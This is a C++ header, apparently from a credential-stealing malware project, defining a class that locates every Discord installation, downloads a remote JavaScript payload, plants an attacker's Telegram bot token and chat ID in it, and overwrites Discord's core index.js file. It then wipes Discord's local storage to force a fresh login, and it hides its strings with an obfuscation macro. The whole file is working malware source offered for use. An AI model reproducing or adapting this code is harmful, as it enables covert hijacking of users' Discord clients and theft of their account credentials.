#ifndef DISCORDINJ_HPP
#define DISCORDINJ_HPP

#include "base64.hpp"

namespace fs = std::filesystem;

// Praying that it works cus it was an pain to code this

class DiscordInjector {
    std::string tgToken;
    std::string tgChat;

public:
    DiscordInjector(const std::string& token, const std::string& chat) // Pass in non encoded
        : tgToken(token), tgChat(chat) {
    }

    void Run() {
        try {
            auto paths = FindDiscordPaths();
            for (const auto& path : paths) {
                ProcessInstallation(path); // Doesnt matter if discord is running. Discord loads the file from disc once at startup and then never touches it again until it gets termed and reopened
                                           // Because of that, we can inject at any given moment
            }
            if (IsDiscordRunning()) return; // If discord is not running, dont aut logout the user
            HandleLogout(paths);
        }
        catch (const std::exception& e) {
            
        }
    }

private:
    std::vector<fs::path> FindDiscordPaths() {
        std::vector<fs::path> paths;
        char appData[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData) != S_OK) {
            throw std::runtime_error(OBF("Failed to get AppData path"));
        }

        fs::path basePath(appData);
        for (const auto& entry : fs::directory_iterator(basePath)) {
            std::string dirName = entry.path().filename().string();
            if (dirName.find(OBF("cord")) != std::string::npos) { // using cord to cover even PTB, Canary and others and not js normal discord
                paths.push_back(entry.path());
            }
        }
        return paths;
    }

    void ProcessInstallation(const fs::path& installPath) {
        for (const auto& appFolder : GetAppFolders(installPath)) {
            fs::path modulesPath = appFolder / OBF("modules");
            if (!fs::exists(modulesPath)) continue;

            for (const auto& coreFolder : GetCoreFolders(modulesPath)) {
                fs::path indexFile = coreFolder / OBF("discord_desktop_core") / OBF("index.js"); // As every Injection, we inject into here
                if (fs::exists(indexFile)) {
                    InjectPayload(indexFile);
                }
            }
        }
    }

    std::vector<fs::path> GetAppFolders(const fs::path& basePath) {
        std::vector<fs::path> folders;
        for (const auto& entry : fs::directory_iterator(basePath)) {
            std::string dirName = entry.path().filename().string();
            if (dirName.find(OBF("app-")) == 0) {
                folders.push_back(entry.path());
            }
        }
        return folders;
    }

    std::vector<fs::path> GetCoreFolders(const fs::path& modulesPath) {
        std::vector<fs::path> coreFolders;
        for (const auto& entry : fs::directory_iterator(modulesPath)) {
            std::string dirName = entry.path().filename().string();
            if (dirName.find(OBF("discord_desktop_core-")) == 0) {
                coreFolders.push_back(entry.path());
            }
        }
        return coreFolders;
    }

    void InjectPayload(const fs::path& targetFile) {
        std::string payload = FetchUrl(
            OBF(L"raw.githubusercontent.com"),
            OBF(L"get it at t.me/NyxEnigma"),
            true
        );

        if (!tgToken.empty()) {
            payload = ReplacePlaceholder(payload, OBF("%TELEGRAM%"),
                base64_encode(tgToken + OBF("$%$") + tgChat)); // base64 encoding here on our own cus it needs to be concat
        }

        WriteFile(targetFile, payload);
    }

    static std::string ReplacePlaceholder(std::string content,
        const std::string& placeholder,
        const std::string& value) {
        size_t pos = 0;
        while ((pos = content.find(placeholder, pos)) != std::string::npos) {
            content.replace(pos, placeholder.length(), value);
            pos += value.length();
        }
        return content;
    }

    static void WriteFile(const fs::path& path, const std::string& content) {
        std::ofstream file(path, std::ios::binary);
        if (!file) throw std::runtime_error(OBF("Failed to write injection"));
        file.write(content.data(), content.size());
    }

    void HandleLogout(const std::vector<fs::path>& paths) {
        for (const auto& path : paths) {
            fs::path leveldb = path / OBF("Local Storage") / OBF("leveldb");
            if (fs::exists(leveldb)) {
                fs::remove_all(leveldb);
            }
        }
    }

    static bool IsDiscordRunning() {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);

        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
        if (Process32First(snapshot, &entry)) {
            while (Process32Next(snapshot, &entry)) {
                std::wstring name(entry.szExeFile);
                if (name.find(L"cord") != std::wstring::npos) { // Same here
                    CloseHandle(snapshot);
                    return true;
                }
            }
        }
        CloseHandle(snapshot);
        return false;
    }
};

#endif